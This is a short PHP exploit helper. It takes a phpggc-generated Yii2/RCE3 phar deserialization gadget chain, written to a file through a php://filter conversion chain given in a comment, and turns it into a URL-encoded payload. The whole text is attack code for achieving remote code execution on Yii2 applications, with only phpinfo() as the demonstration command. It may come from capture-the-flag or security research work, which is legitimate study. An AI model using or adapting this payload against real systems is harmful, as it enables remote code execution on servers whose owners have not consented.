<?php
$file = "./test.txt";
$encodePayload = '';
$payload = file_get_contents($file);
$encodePayload = str_replace("=FE=FF", "", $payload);
file_put_contents($file, urlencode($encodePayload."=00=00=00=00"));

//php phpggc Yii2/RCE3 "phpinfo();//az" --phar phar -o "php://filter/convert.base64-encode|convert.iconv.utf-8.utf-16|convert.quoted-printable-decode/resource=./test.txt"